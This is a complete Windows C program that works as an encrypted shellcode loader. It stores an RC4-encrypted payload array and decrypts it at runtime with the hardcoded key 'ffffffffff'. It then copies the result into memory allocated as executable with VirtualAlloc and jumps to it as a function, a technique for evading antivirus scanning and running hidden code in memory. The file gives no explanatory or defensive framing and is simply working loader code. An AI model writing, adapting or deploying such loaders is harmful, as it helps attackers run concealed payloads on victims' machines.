#include "stdio.h"
#include "Windows.h"

const unsigned char PayloadEncrypted[] =
"\xac\x80\x86\x15\x99\xad\x90\x3a\xe9\xa9\xbf\x22\xd8\xbf\x5d\x33"
"\xe7\xab\x87\x30\xa1\x6b\xef\xc8\x47\x6b\x40\xb1\xf5\xd3\x5a\xbc"
"\x12\x37\x68\xf1\xe6\x8c\x01\xc4\x51\xb6\x1f\xfb\xe0\x28\xb1\xe1"
"\xc9\xc4\x3f\x3b\x75\xe1\xd4\x60\xb2\x80\x77\xfe\x3d\x87\xbe\xa4"
"\x70\xff\x77\x9a\x16\xb3\x58\xe4\x20\x20\x9d\xab\x79\x5b\xea\xa8"
"\x85\x04\x9a\x75\x27\xb8\x1e\x6f\x52\x13\x55\x77\xe9\x70\x8c\xa5"
"\x67\x37\x2d\xea\xea\x21\xe4\x7c\x04\x58\x94\xfd\x70\x8c\xe3\x17"
"\x0c\xf2\xe4\xd0\x04\x9b\xbc\xac\x3c\x31\x09\x5f\xa1\x4b\xa3\x90"
"\xf0\xbc\xe8\x21\x67\x66\x59\x0d\xad\x67\x15\xe7\x29\xdd\x93\x21"
"\x49\xb9\x7a\x61\x71\x67\x66\xb4\xe6\x81\xbd\x47\x1c\x1f\x5a\x74"
"\x31\x65\x3c\x3b\xab\xa4\xb0\xaa\xd9\x67\x72\xf3\x1b\x62\xc2\xfb"
"\x72\xb1\x10\xba\x25\xad\xe7\xfd\xfa\x12\x4d\x1e\x87\x11\x95\x47"
"\x02\xf3\x3e\x94\x91\x70\x03\x51\xc4\xa0\x52\x16\x42\xba\x59\x7a"
"\x11\xe2\x37\xca\x5b\xd6\xf0\x31\x97\x50\x13\xeb\x0b\xce\x40\xd3"
"\xa2\x18\x81\x7a\xa4\x6b\xa0\x6d\x7d\xb2\x9f\xc5\xc6\xc5\x20\x52"
"\x04\xda\x51\xd8\x61\x58\x93\x80\x54\x08\x15\xc3\x60\xd6\x89\x6a"
"\xdd\x7d\x74\x85\xa5\x3d\x0f\x49\x39\x90\x53\x9d\xd2\x0d\x97\xd8"
"\x47\xa2\xad\x02\x5a";

typedef struct
{
    unsigned int i;
    unsigned int j;
    unsigned char s[256];

} Rc4Context;


void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
    unsigned int i;
    unsigned int j;
    unsigned char temp;

    // Check parameters
    if (context == NULL || key == NULL)
        return;

    // Clear context
    context->i = 0;
    context->j = 0;

    // Initialize the S array with identity permutation
    for (i = 0; i < 256; i++)
    {
        context->s[i] = i;
    }

    // S is then processed for 256 iterations
    for (i = 0, j = 0; i < 256; i++)
    {
        //Randomize the permutations using the supplied key
        j = (j + context->s[i] + key[i % length]) % 256;

        //Swap the values of S[i] and S[j]
        temp = context->s[i];
        context->s[i] = context->s[j];
        context->s[j] = temp;
    }

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
    unsigned char temp;

    // Restore context
    unsigned int i = context->i;
    unsigned int j = context->j;
    unsigned char* s = context->s;

    // Encryption loop
    while (length > 0)
    {
        // Adjust indices
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        // Swap the values of S[i] and S[j]
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        // Valid input and output?
        if (input != NULL && output != NULL)
        {
            //XOR the input data with the RC4 stream
            *output = *input ^ s[(s[i] + s[j]) % 256];

            //Increment data pointers
            input++;
            output++;
        }

        // Remaining bytes to process
        length--;
    }

    // Save context
    context->i = i;
    context->j = j;
}

typedef int (WINAPI* PayloadFunction) ();

int main() {
    size_t data_len = sizeof(PayloadEncrypted);
    unsigned char* plaintext = (unsigned char*)malloc(data_len);
    if (!plaintext) return 1;

    Rc4Context ctx = { 0 };
    unsigned char* key = (unsigned char*)"ffffffffff";
    size_t key_len = strlen((char*)key);

    rc4Init(&ctx, key, key_len);
    rc4Cipher(&ctx, PayloadEncrypted, plaintext, data_len);

    for (size_t i = 0; i < data_len; i++) {
        printf("\\x%02x", plaintext[i]);
    }

    LPVOID mem_exec = VirtualAlloc(NULL, data_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem_exec, plaintext, data_len);
    PayloadFunction func = (PayloadFunction)mem_exec;
    func();
    free(plaintext);
    system("pause");
    return 0;
}